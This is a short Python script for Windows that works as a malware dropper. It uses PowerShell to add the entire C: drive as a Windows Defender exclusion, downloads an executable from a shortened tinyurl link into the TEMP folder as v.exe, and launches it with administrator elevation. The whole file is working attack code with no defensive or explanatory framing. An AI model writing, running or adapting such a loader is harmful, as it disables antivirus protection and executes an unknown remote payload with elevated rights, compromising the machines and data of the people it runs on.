import subprocess
import os
import requests
import ctypes

# Function to run PowerShell commands
def run_powershell_command(command):
    subprocess.run(["powershell", "-Command", command])

# Add exclusion path in Windows Defender
exclusion_path = "'C:\\'"
run_powershell_command(f"Add-MpPreference -ExclusionPath {exclusion_path}")

# Download the executable
url = "https://tinyurl.com/R0CKZZ"
download_path = os.path.join(os.getenv('TEMP'), 'v.exe')
response = requests.get(url)
with open(download_path, 'wb') as f:
    f.write(response.content)

# Run the executable as admin
if os.name == 'nt':  # Check if OS is Windows
    params = f'/c {download_path}'
    ctypes.windll.shell32.ShellExecuteW(None, "runas", "cmd.exe", params, None, 1)
else:
    print("This script only runs on Windows.")
